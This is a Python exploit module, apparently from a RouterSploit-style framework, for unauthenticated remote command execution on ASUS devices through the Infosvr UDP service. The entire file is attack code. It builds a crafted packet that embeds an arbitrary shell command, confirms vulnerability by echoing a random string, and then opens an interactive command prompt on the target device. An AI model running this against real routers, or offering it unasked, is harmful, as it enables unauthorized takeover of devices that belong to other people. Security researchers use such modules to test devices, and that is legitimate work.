# asus_infosvr_rce.py
# rsf exploit module
# description: Remote command execution in ASUS devices via Infosvr UDP service

import socket
import struct
import random
import string


def random_text(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))


def udp_send_recv(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(payload, (ip, port))
    try:
        data, _ = sock.recvfrom(512)
    except socket.timeout:
        data = None
    sock.close()
    return data


def run(target, port):
    if check(target, port):
        print("[+] Target is vulnerable")
        while True:
            cmd = input("cmd> ")
            if cmd.strip().lower() in ["exit", "quit"]:
                break
            print(execute(target, port, cmd))
    else:
        print("[-] Target is not vulnerable")


def execute(target, port, cmd):
    if len(cmd) > 237:
        print("[-] Command too long")
        return

    ibox_comm_pkt_hdr_ex = (
        struct.pack("<B", 0x0c) +
        struct.pack("<B", 0x15) +
        struct.pack("<H", 0x33) +
        random_text(4).encode() +
        random_text(6).encode() +
        random_text(32).encode()
    )

    cmd_bytes = cmd.encode() + struct.pack("<B", 0x00)
    pkt_syscmd = struct.pack("<H", len(cmd_bytes)) + cmd_bytes
    payload = ibox_comm_pkt_hdr_ex + pkt_syscmd + random_text(512 - len(ibox_comm_pkt_hdr_ex + pkt_syscmd)).encode()

    response = udp_send_recv(target, port, payload)

    if response and len(response) == 512:
        length = struct.unpack('<H', response[14:16])[0]
        return response[16: 16 + length].decode()

    return ""


def check(target, port):
    for _ in range(5):
        rand_val = random_text(32)
        result = execute(target, port, f"echo {rand_val}")
        if rand_val in result:
            return True
    return False

